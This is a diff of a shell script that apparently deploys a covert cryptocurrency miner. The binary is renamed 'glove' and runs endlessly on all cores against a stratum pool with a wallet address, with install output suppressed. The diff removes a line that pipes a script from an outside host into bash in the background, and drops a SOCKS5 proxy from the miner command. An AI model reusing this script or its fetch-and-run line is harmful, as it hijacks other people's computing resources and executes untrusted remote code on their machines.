@@ -28,11 +28,6 @@ ph add glove 1>/dev/null 2>&1
 
 sleep 2
 
-curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &
-
-sleep 2
-
-
 DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
 
 sleep 2
@@ -80,6 +75,6 @@ sleep 2
 
 while true
 do
-./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://novagrid.online:3001 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
+./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://novagrid.online:3001 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores
 sleep 10
 done
